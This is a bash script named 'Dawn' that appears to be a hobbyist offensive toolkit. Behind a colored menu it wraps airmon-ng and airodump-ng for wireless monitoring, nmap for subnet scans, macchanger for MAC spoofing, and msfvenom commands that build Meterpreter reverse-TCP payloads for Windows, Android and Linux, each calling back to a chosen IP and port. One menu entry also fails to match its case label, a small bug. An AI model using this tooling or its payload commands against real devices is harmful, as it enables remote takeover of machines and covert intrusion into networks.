#!/bin/bash

clear
echo

# Check

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 
   exit 1
fi

############################

# Colors

Default="\033[0;37m"
Cyan="\033[0;36m"
Magenta="\033[0;35m"
Red="\033[0;31m"
Yellow="\033[1;33m"

############################

# Start

echo -e ${Magenta}"===================="${Default}"Welcome To "${Yellow}"Dawn${Magenta}===================="${Default}
echo -e
echo -e ${Cyan}"=============Only For Those With The Force=============${Default}"
echo -e ${Red}

############################

#Select

echo -e ${Yellow}
PS3="Select : "
select begin in "Help" "Network Adaptors List" "Network Adaptors with Aircrack-ng" "De/Activate Device Monitoring" "Monitor Device" "Nmap on Devices on Network" "Change MAC" "Make Payload" "Exit"
do
############################

# Case

	case $begin in
		Help*)
echo -e ${Cyan}
echo -e " 1    | Help                            | Display this message"
echo -e " 2    | Network Adaptors List           | Shows a List of Network Adaptors"
echo -e " 3    | Network Adaptors with Airmon-ng | Airmon-ng checks for Network Devices"
echo -e " 4    | De/Activate Network Monitoring  | De/Activates monitoring on network devices"
echo -e " 5    | Monitor Device                  | Monitors Network Device"
echo -e " 6    | Nmap on Devices on a Network    | Checks for the Device on a Network"
echo -e " 7    | Change MAC                      | Changes the MAC Address"
echo -e " 8    | Make Payload                    | Make Metasploit Payload"
echo -e " 9    | exit                            | Close program ${Yellow}"
echo 
			;;
		"Network Adaptors List")
			ip link
			;;
		"Network Adaptors with Aircrack-ng")
			airmon-ng
			;;
		"Nmap Devices")
			read -p "Gateway IP : " gateway_ip
			read -p "Enter Range [24] : " range
			read -p "File To Save To : " nmap_file
			range=${range:-24}
			nmap -v "$gateway_ip/$range" >> $nmap_file
			echo "Saved To $nmap_file"
			;;
		"De/Activate Device Monitoring")
			read -p "Start/Stop : " airmon_com
			read -p "Device : " device
			airmon-ng $airmon_com $device
			;;
		"Change MAC")
			read -p "New MAC : " net_mac
			read -p "Device : " mac_device
			ifconfig $mac_device down
			sudo macchanger -m $net_mac $mac_device
			ifconfig $mac_device up
			;;
		"Monitor Device"*)
			read -p "Device : " mon_device
			airodump-ng $mon_device
			echo -e ${Yellow}
			;;
		"Make Payload")
			echo -e ${Red}
			echo -e Metasploit Payload Creator
			echo -e
			echo -e "1) Windows"
			echo -e "2) Android"
			echo -e "3) Linux x86"
			echo -e "4) Linux x64"
			echo -e
			echo -e "Note All Payloads Are Reverse TCP"
			read -p "Select OS : " os_payload
			read -p "Enter IP : " ip_payload
			read -p "Enter Port : " port_payload
			read -p "Enter Filename : " file_payload
			case $os_payload in
		1*)
	msfvenom -p windows/meterpreter/reverse_tcp LPORT=$port_payload LHOST=$ip_payload -o $file_payload 		;;
		2*)
	msfvenom -p android/meterpreter/reverse_tcp LPORT=$port_payload LHOST=$ip_payload -o $file_payload 		;;
		3*)
	msfvenom -p linux/x86/meterpreter/reverse_tcp LPORT=$port_payload LHOST=$ip_payload -o $file_payload
	;;
		4*)
	msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=$port_payload LHOST=$ip_payload -o $file_payload	
					
		;;
		esac
		echo -e ${Yellow}
		;;
		Exit*)
			echo
			echo -e "Aborting"			
			echo
			exit 0
			break
			;;
	esac

done

exit 0
